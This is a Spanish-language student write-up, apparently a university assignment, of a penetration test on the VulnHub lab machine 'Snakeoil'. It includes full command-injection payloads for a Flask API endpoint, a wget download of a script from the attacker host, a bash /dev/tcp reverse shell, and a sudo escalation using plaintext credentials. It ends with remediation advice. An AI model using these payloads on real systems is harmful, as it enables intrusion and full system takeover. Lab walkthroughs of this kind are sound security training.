Walkthrough: Auditoría de Seguridad y Pentesting a "Snakeoil"

Reporte Técnico de Análisis de Vulnerabilidades API, Inyección de Comandos y Escalada de Privilegios.

1. Introducción y Objetivos

El presente informe documenta el desarrollo de una auditoría de seguridad y prueba de penetración (pentesting) sobre la máquina virtual objetivo Snakeoil, alojada en la plataforma VulnHub.

El propósito principal es aplicar una metodología estructurada que abarca desde la identificación del entorno de red aislada hasta el compromiso total del sistema (acceso root), evaluando vulnerabilidades en aplicaciones web, APIs y configuraciones del sistema local.

Detalles del Proyecto:

  • Institución: Universidad Politécnica de San Luis Potosí (UPSLP)
  • Materia / Asignatura: CNO4 Programación WAP (7mo Semestre)
  • Autor(a): Lizeth Infante Martinez
  • Docente: Mtro. Servando López Contreras[cite: 1]

Objetivos Específicos:

  • Preparar un entorno aislado mediante herramientas de proxy de intercepción (FoxyProxy / Burp Suite)[cite: 1].
  • Descubrir la IP objetivo y realizar el escaneo profundo de puertos y servicios expuestos[cite: 1].
  • Mapear rutas ocultas, analizar la API REST en el puerto 8080 y extraer tokens / claves secretas[cite: 1].
  • Explotar una vulnerabilidad de Inyección de Comandos para obtener una consola remota (Reverse Shell)[cite: 1].
  • Realizar la post-explotación, identificar credenciales en texto plano y escalar privilegios a superusuario (root)[cite: 1].

2. Preparación del Entorno, Reconocimiento y Escaneo

Antes de iniciar el reconocimiento, se configuró la extensión FoxyProxy en Firefox para redirigir el tráfico web hacia Burp Suite listening en 127.0.0.1:8080[cite: 1].

Posteriormente, se ejecutaron escaneos de descubrimiento en el segmento de red local (192.168.100.0/24) para identificar el host objetivo[cite: 1]: 

# Descubrimiento de Host en la Subred
sudo nmap -sn 192.168.100.0/24
sudo arp-scan -l
nmap -T4 -F 192.168.100.1/24

# IP Objetivo Identificada: 192.168.100.2

# Escaneo Profundo de Puertos y Servicios (65,535 puertos TCP)
nmap -p- --open -sC -sV 192.168.100.2

Resultados del Escaneo de Puertos:

Puerto Estado Servicio Descripción / Función
22/TCP Abierto SSH Acceso a consola remota segura[cite: 1]
80/TCP Abierto HTTP Servidor Web Principal (Nginx)[cite: 1]
8080/TCP Abierto HTTP / Proxy Servidor Web Secundario / API REST (Werkzeug/Flask)[cite: 1]

3. Enumeración Web y Explotación de la API

Tras revisar el puerto 80 y ejecutar nikto -h http://192.168.100.2 sin hallar datos críticos, se procedió a realizar enumeración de directorios en el puerto 8080 mediante gobuster[cite: 1]: 

gobuster dir -u http://192.168.100.2:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.bak

Rutas descubiertas: /users, /registration, /login, /run, /secret y /create[cite: 1].

Paso 1: Registro y Autenticación en la API

Mediante Burp Suite Repeater, se modificó la petición a /registration de GET a POST enviando los parámetros username=Lizi y password=1234, obteniendo un access_token[cite: 1]. Luego, se autenticó en /login (POST) para obtener un refresh_token[cite: 1].

Paso 2: Extracción de la Clave Secreta

Se realizó una petición GET hacia /secret incluyendo la cookie access_token_cookie=[access_token], obteniendo la clave secreta en la respuesta JSON[cite: 1]: 

{
    "secret_key": "commandexecutionissecret"
}

Paso 3: Vulnerabilidad de Inyección de Comandos (Endpoint /run)

Vulnerabilidad Identificada: Inyección de Comandos. El endpoint /run acepta peticiones POST en formato JSON. Al concatenar operadores de shell como && dentro del parámetro url, el servidor ejecuta la orden arbitrary y devuelve el resultado en el cuerpo de la respuesta HTTP[cite: 1]. 
/* Petición de prueba enviada a /run */
POST /run HTTP/1.1
Host: 192.168.100.2:8080
Content-Type: application/json

{
    "url": "127.0.0.1:80 && id",
    "secret_key": "commandexecutionissecret"
}

4. Consola Inversa y Escalada de Privilegios

Establecimiento de la Reverse Shell:

En la máquina atacante Kali Linux (IP 192.168.100.3) se preparó un script shell.sh y un listener Netcat[cite: 1]: 

# 1. Listener en Kali Linux
sudo nc -nlvp 5555

# 2. Contenido de shell.sh
bash -i >& /dev/tcp/192.168.100.3/5555 0>&1

# 3. Servidor web temporal en Kali Linux
python3 -m http.server 8000

Se enviaron las peticiones JSON secuenciales al endpoint /run para transferir, otorgar permisos y ejecutar la shell[cite: 1]:

  1. Descargar: "url": "127.0.0.1:80 && wget http://192.168.100.3:8000/shell.sh"[cite: 1]
  2. Permisos: "url": "127.0.0.1:80 && chmod +x shell.sh"[cite: 1]
  3. Ejecutar: "url": "127.0.0.1:80 && ./shell.sh"[cite: 1]

Post-Explotación y Obtención de la Primera Bandera:

Tras recibir la conexión en Netcat, se estabilizó la terminal TTY mediante Python 3[cite: 1]: 

python3 -c 'import pty; pty.spawn("/bin/bash")'
cd /home/patrick
cat local.txt

Resultado: Bandera de usuario local (local.txt) obtenida[cite: 1].

Análisis de Archivos y Escalada a Root:

Al inspeccionar el código fuente del proyecto web en /home/patrick/flask_blog/app.py, se detectaron credenciales del sistema guardadas en texto plano dentro de la variable app.config[cite: 1]: 

# Credenciales extraídas en texto plano desde app.py:
snakeoilisnotgoodforcorporations
NOreasonableDOUBTthisPASSWORDISGOOD

Se utilizó la contraseña para ejecutar comandos elevados con sudo[cite: 1]: 

sudo /bin/bash
# Contraseña ingresada: NOreasonableDOUBTthisPASSWORDISGOOD

# Acceso Superusuario Conseguido!
whoami
# Output: root

cd /root
cat proof.txt

Resultado: Bandera final de root (proof.txt) extraída exitosamente[cite: 1].

5. Conclusiones y Recomendaciones Técnicas

La prueba de penetración demostró cómo la combinación de fallos en el control de acceso en endpoints API, la falta de sanitización en la ejecución de comandos y malas prácticas de desarrollo (credenciales harcodeadas) pueden permitir a un atacante comprometer totalmente la infraestructura[cite: 1].

Seguridad en APIs y Sanitización

  • Validar y desinfectar rigurosamente los parámetros de entrada en endpoints como /run, evitando la concatenación directa de comandos del sistema[cite: 1].
  • Restringir el acceso a funciones críticas de ejecución remota de comandos[cite: 1].

Gestión de Credenciales y Privilegios

  • Eliminar cualquier contraseña o clave secreta en texto plano dentro del código fuente (app.py), utilizando variables de entorno protegidas[cite: 1].
  • Aplicar el Principio del Menor Privilegio (PoLP) en la configuración de permisos sudoers[cite: 1].
